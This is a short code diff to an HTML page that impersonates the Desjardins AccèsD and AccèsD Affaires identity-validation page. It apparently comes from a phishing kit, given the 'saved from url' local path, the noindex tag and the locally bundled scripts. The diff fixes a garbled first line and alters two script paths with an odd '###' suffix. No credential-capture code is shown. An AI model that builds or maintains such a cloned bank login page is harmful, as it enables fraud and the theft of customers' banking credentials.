@@ -1,5 +1,5 @@
 
-<? php  ?>=(0039)/220098/desj/f -->
+<!-- saved from url=(0039)/220098/desj/f -->
 <html lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
         <title>Valider l'identité AccèsD AccèsD Affaires | Desjardins</title>
         <meta name="robots" content="noindex, nofollow">
@@ -328,11 +328,11 @@
                     </footer>
                     <!-- MONITEUR D'ACTIVITES -->
                     <!-- Inclusion des fichiers javascripts pour le comportement -->
-                    <script src="./files/bootstrap.min" type="text/javascript"></script>
+                    <script src="./files/bootstrap.min.js###" type="text/javascript"></script>
                     <!--[if lt IE 9]>
                     <script src="/assets/desj/files/respond.min.js"></script>
                     <![endif]-->
-                    <script src="./files/fwd-bootstrap.min" type="text/javascript"></script>
+                    <script src="./files/fwd-bootstrap.min.js###" type="text/javascript"></script>
                     <!--[if IE]>
                     <script src="/assets/desj/files/fwd-bootstrap-ie.min.js" type="text/javascript"></script>
                     <![endif]-->
